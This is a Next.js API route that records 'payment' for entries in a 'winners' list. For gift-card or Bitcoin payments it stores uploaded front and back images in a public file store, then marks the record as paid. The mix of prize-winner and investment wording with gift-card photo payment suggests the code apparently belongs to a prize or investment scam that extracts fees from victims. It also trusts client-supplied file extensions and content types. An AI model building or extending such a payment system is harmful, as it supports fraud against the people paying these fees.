import { NextRequest, NextResponse } from "next/server";
import { getPaymentFilesStore, buildPublicFileUrl } from "../../../lib/blob-store";
import { getWinners, saveWinners } from "../../../lib/store";

async function validateAndSaveFile(
  file: File,
  refId: string,
  suffix: string
): Promise<{ url?: string; error?: NextResponse }> {
  const maxSize = 50 * 1024 * 1024;
  const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp'];

  if (file.size > maxSize) {
    return {
      error: NextResponse.json(
        { error: `File "${file.name}" exceeds 50MB limit` },
        { status: 400 }
      )
    };
  }

  if (!allowedTypes.includes(file.type)) {
    return {
      error: NextResponse.json(
        { error: `File "${file.name}" is not a valid image format` },
        { status: 400 }
      )
    };
  }

  try {
    const timestamp = Date.now();
    const randomString = Math.random().toString(36).substring(2, 10);
    const extension = file.name.split('.').pop();
    const filename = `${refId}_${suffix}_${timestamp}_${randomString}.${extension}`;

    const store = getPaymentFilesStore();
    await store.set(filename, file, {
      metadata: { contentType: file.type },
    });

    return { url: buildPublicFileUrl(filename) };
  } catch (error) {
    return {
      error: NextResponse.json(
        { error: `Failed to upload "${file.name}"` },
        { status: 500 }
      )
    };
  }
}

export async function POST(request: NextRequest) {
  try {
    const formData = await request.formData();
    const paymentMethod = formData.get("paymentMethod") as string;
    const id = (formData.get("id") || formData.get("userId")) as string;

    console.log('📥 Payment submission:', { id, paymentMethod });
    console.log('📎 Files in formData:');
    for (const [key, value] of formData.entries()) {
      if (value instanceof File) {
        console.log(`  ${key}: ${value.name} (${value.size} bytes)`);
      } else {
        console.log(`  ${key}: ${value}`);
      }
    }

    if (!id || !paymentMethod) {
      return NextResponse.json(
        { error: "Investment ID and payment method are required" },
        { status: 400 }
      );
    }

    const winners = await getWinners();
    const winnerIndex = winners.findIndex(w => w.id.toLowerCase() === id.toLowerCase());

    if (winnerIndex === -1) {
      return NextResponse.json(
        { error: "Investment not found" },
        { status: 404 }
      );
    }

    const winner = winners[winnerIndex];
    const uploadedFiles: string[] = [];
    const frontFile = formData.get("front") as File | null;
    const backFile = formData.get("back") as File | null;
    const files = formData.getAll("files") as File[];

    console.log('💾 Payment method:', paymentMethod);
    console.log('📁 Files to upload:', { front: !!frontFile, back: !!backFile, files: files.length });

    // Upload files first
    if (paymentMethod === "giftcard" || paymentMethod === "btc") {
      if (frontFile) {
        const frontValidation = await validateAndSaveFile(frontFile, winner.id, 'front');
        if (frontValidation.error) return frontValidation.error;
        if (frontValidation.url) uploadedFiles.push(frontValidation.url);
      }
      if (backFile) {
        const backValidation = await validateAndSaveFile(backFile, winner.id, 'back');
        if (backValidation.error) return backValidation.error;
        if (backValidation.url) uploadedFiles.push(backValidation.url);
      }
      for (const file of files) {
        if (file && file.size > 0) {
          const validation = await validateAndSaveFile(file, winner.id, `file_${uploadedFiles.length}`);
          if (validation.error) return validation.error;
          if (validation.url) uploadedFiles.push(validation.url);
        }
      }
    }

    console.log('✅ Uploaded file URLs:', uploadedFiles);

    // Update existing investment with payment confirmation
    winner.claimInfo = {
      fullName: winner.userName || 'Unknown',
      phoneNumber: '',
      email: winner.userEmail || '',
      houseAddress: '',
      occupation: '',
      country: '',
      savedAt: new Date().toISOString(),
      paymentMethod,
      paymentConfirmedAt: new Date().toISOString(),
      paymentFiles: uploadedFiles,
      submittedAt: new Date().toISOString(),
    } as any;

    winners[winnerIndex] = winner;
    await saveWinners(winners);

    return NextResponse.json({
      message: "Payment details submitted successfully",
      investment: winner,
    });
  } catch (error) {
    console.error("Payment submission error:", error);
    return NextResponse.json(
      { error: "Failed to submit payment" },
      { status: 500 }
    );
  }
}